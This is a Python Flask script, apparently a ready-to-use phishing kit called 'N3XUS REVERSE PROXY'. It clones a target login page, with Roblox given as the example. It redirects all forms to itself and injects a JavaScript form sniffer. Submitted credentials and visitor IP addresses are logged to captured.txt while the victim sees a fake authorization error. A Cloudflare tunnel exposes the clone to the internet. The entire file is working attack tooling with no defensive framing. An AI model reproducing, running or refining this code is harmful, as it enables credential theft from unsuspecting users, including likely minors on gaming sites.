from flask import Flask, request
import requests
from bs4 import BeautifulSoup
import urllib.parse
import threading
import subprocess
import os
import datetime
import logging                                                                                  
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask(__name__)
target_site = ""


LOCAL_PAGE = "index_local.html"
server_started = False

def download_mirror(url):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        print("\n[*] Creating local copy of the page...")
        resp = requests.get(url, headers=headers, timeout=15)
        soup = BeautifulSoup(resp.text, 'html.parser')

        parsed_target = urllib.parse.urlparse(url)
        base_url = f"{parsed_target.scheme}://{parsed_target.netloc}"

        for tag in soup.find_all(['link', 'script', 'img']):
            attr = 'href' if tag.name == 'link' else 'src'
            val = tag.get(attr)
            if val:
                if val.startswith('/'):
                    tag[attr] = base_url + val
                elif not val.startswith('http') and not val.startswith('data:'):
                    tag[attr] = base_url + '/' + val

        for form in soup.find_all('form'):
            form['action'] = '/'
            form['method'] = 'POST'

        sniffer_script = soup.new_tag("script")
        sniffer_script.string = """
        document.addEventListener("submit", function(e) {
            let formData = new FormData(e.target);
            let data = {};
            formData.forEach((value, key) => { data[key] = value; });
            fetch('/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }, true);
        """
        if soup.body:
            soup.body.append(sniffer_script)
        else:
            soup.append(sniffer_script)

        with open(LOCAL_PAGE, "w", encoding="utf-8") as f:
            f.write(str(soup))
        print("[+] Local copy created successfully!")
    except Exception as e:
        print(f"[!] Error downloading copy: {e}")

@app.route("/", methods=["GET", "POST"])
def mirror_server():
    client_ip = request.headers.get("CF-Connecting-IP", request.remote_addr)

    xff = request.headers.get("X-Forwarded-For", "")
    via = request.headers.get("Via", "")
    is_vpn_proxy = False
    if via or (xff and "," in xff):
        is_vpn_proxy = True

    vpn_text = "(coming soon)" if is_vpn_proxy else "(coming soon)"
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if request.method == "POST":
        form_data = {}
        if request.is_json:
            form_data = request.get_json(silent=True) or {}
        if not form_data:
            form_data = request.form.to_dict()
        if not form_data:
            form_data = request.values.to_dict()
        if not form_data and request.data:
            form_data = {"raw_data": request.data.decode('utf-8', errors='ignore')}

        print("\n" + "="*50)
        print(f" [!] NEW DATA INTERCEPTED! [{current_time}]")
        print(f" 🌐 IP Address : {client_ip}")
        print(f" 🛡️ VPN/Proxy  : {vpn_text}")
        print(f" 🔑 Data       :")
        for key, value in form_data.items():
            print(f"    -> {key}: {value}")
        print("="*50 + "\n")

        with open("captured.txt", "a", encoding="utf-8") as f:
            f.write(f"[{current_time}] IP: {client_ip} | VPN: {vpn_text} | Data: {form_data}\n")

        return f"<script>alert('Authorization error. Please try again.'); window.location.href='/';</script>"

    print(f"[{current_time}] Site visit | IP: {client_ip} | VPN: {vpn_text}")

    if os.path.exists(LOCAL_PAGE):
        with open(LOCAL_PAGE, "r", encoding="utf-8") as f:
            return f.read()
    return "Target not configured yet.", 404

def run_flask():
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def run_tunnel():
    subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:5000"])

if __name__ == "__main__":
    while True:
        os.system("clear")
        print("="*40)
        print("         N3XUS REVERSE PROXY")
        print("              by TROJAN     ")
        print("="*40)
        print(" [1] Specify link and launch mirror")
        print(" [2] View captured data (captured.txt)")
        print(" [3] Exit")
        print("="*40)

        choice = input("Select an option: ").strip()

        if choice == "1":
            target_site = input("\nEnter target URL (e.g., https://www.roblox.com/Login): ").strip()
            if target_site:
                download_mirror(target_site)

                if not server_started:
                    threading.Thread(target=run_flask, daemon=True).start()
                    threading.Thread(target=run_tunnel, daemon=True).start()
                    server_started = True
                    print("\n[+] Flask server and Cloudflare tunnel started successfully!")
                else:
                    print("\n[+] Target updated, mirror recreated!")

                input("\nPress Enter to return to the menu...")
            else:
                input("\n[!] URL cannot be empty. Press Enter...")

        elif choice == "2":
            print("\n" + "="*40)
            print(" --- CAPTURED DATA ---")
            if os.path.exists("captured.txt"):
                with open("captured.txt", "r", encoding="utf-8") as f:
                    print(f.read())
            else:
                print("captured.txt is empty so far.")
            print("="*40)
            input("\nPress Enter to return to the menu...")

        elif choice == "3":
            print("Exiting program...")
            os._exit(0)
        else:
            input("\n[!] Invalid choice. Press Enter...")
